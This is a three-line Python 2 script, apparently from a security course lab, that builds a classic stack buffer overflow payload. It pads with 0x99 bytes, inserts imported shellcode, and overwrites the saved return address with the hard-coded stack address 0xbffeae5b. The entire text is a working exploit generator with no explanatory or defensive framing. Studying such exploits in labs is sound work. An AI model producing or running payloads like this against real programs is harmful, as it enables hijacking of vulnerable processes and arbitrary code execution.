from shellcode import shellcode
from struct import pack
print "\x99"*(1024 - len(shellcode)) + shellcode + "\x99"*12 + pack("<I", 0xbffeae5b)
